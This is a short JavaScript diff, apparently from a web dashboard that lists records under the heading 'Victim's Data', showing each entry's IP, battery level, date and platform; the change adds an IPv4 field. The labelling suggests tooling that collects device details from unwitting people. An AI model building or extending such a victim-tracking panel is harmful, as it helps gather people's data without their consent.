@@ -22,6 +22,7 @@ const fetchData = async () => {
                 <ul> 
                     <h3>Victim's Data      ${row.uid}</h3>
                     <li>ip: ${row.ip}</li> 
+                    <li>ipv4: ${row.ipv4}</li> 
                     <li>battery: ${row.battery_percentage}</li> 
                     <li>date: ${row.date}</li> 
                     <li>platforn: ${row.platform}</li> 
